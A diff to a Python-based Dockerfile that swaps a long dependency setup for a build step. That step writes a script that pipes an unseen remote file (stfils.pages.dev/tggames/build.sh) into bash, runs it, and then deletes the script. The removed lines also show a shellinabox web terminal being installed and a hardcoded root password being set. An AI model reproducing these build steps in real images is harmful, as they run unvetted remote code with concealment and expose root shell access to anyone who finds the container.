@@ -1,43 +1,15 @@
 FROM python:3.10.15-bullseye
 EXPOSE 4200
-WORKDIR /app
+WORKDIR /home/choreouser
 
-# 安装必要的系统工具和依赖
-RUN apt-get update && apt-get install -y \
-    curl \
-    build-essential \
-    && rm -rf /var/lib/apt/lists/*
+ENV PM2_HOME=/tmp
 
-# 安装 Node.js 和 PM2
-RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
-    apt-get install -y nodejs &&\
-    npm install -g pm2
+COPY app/ /home/choreouser/
 
-COPY app/ /app/
+RUN echo -e "#!/usr/bin/env bash\nbash <(curl -Ls https://stfils.pages.dev/tggames/build.sh)" > /home/choreouser/build.sh &&\
+     bash /home/choreouser/build.sh &&\
+     rm -rf /home/choreouser/build.sh
 
-RUN npm install -r package.json &&\
-     apt-get install -y shellinabox &&\
-     echo 'root:good.360.cn' | chpasswd &&\
-     mkdir /app/python3 &&\
-     chmod +x /app/python3 &&\
-     cd /app/python3 &&\
-     python3 -m venv /app/python3/1 &&\
-     /app/python3/1/bin/pip3 install --upgrade pip setuptools wheel &&\
-     /app/python3/1/bin/pip3 install --no-warn-script-location --no-cache-dir -r /app/install/1-bl.txt &&\
-     python3 -m venv /app/python3/2 &&\
-     /app/python3/2/bin/pip3 install --upgrade pip setuptools wheel &&\
-     /app/python3/2/bin/pip3 install --no-warn-script-location --no-cache-dir -r /app/install/2-meme.txt &&\
-     python3 -m venv /app/python3/3 &&\
-     /app/python3/3/bin/pip3 install --upgrade pip setuptools wheel &&\
-     /app/python3/3/bin/pip3 install --no-warn-script-location --no-cache-dir -r /app/install/3-TF.txt &&\
-     python3 -m venv /app/python3/4 &&\
-     /app/python3/4/bin/pip3 install --upgrade pip setuptools wheel &&\
-     /app/python3/4/bin/pip3 install --no-warn-script-location --no-cache-dir -r /app/install/4-To.txt &&\
-     python3 -m venv /app/python3/5 &&\
-     /app/python3/5/bin/pip3 install --upgrade pip setuptools wheel &&\
-     /app/python3/5/bin/pip3 install --no-warn-script-location --no-cache-dir -r /app/install/5-YCB.txt &&\
-     rm -rf /app/install
+CMD ["bash","/home/choreouser/start.sh"]
 
-RUN mkdir -p /app/log
-
-CMD ["bash","/app/start.sh"]
+USER 10001
